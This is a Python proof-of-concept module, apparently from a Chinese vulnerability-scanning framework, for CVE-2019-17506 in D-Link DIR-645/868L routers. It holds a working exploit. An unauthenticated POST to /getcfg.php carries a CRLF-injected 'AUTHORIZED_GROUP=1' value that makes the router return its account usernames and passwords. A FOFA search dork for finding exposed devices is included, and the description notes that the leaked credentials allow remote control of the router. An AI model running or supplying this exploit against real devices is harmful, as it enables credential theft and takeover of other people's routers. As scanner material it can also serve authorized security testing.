# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "D-Link Dir-645 getcfg.php 账号密码泄露漏洞(CVE-2019-17506)",                        # 漏洞名称
        "VulnID" : "CVE-2019-17506",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "D-Link Dir-645",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            D-Link DIR-868L B1-2.03和DIR-817LW A1-1.04路由器上有一些不需要身份验证的Web界面。
            攻击者可以通过
                SERVICES的DEVICE.ACCOUNT值
                以及AUTHORIZED_GROUP = 1％0a
            来获取getcfg.php的路由器的用户名和密码（以及其他信息）。
            这可用于远程控制路由器
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="D_Link-DIR-868L"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/getcfg.php" # url自己按需调整
        data = "SERVICES=DEVICE.ACCOUNT&attack=ture%0D%0AAUTHORIZED_GROUP%3D1"
        

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url,data = data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if "<uid>USR-</uid>" in req.text and "<service>DEVICE.ACCOUNT</service>" in req.text and req.status_code == 200:
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()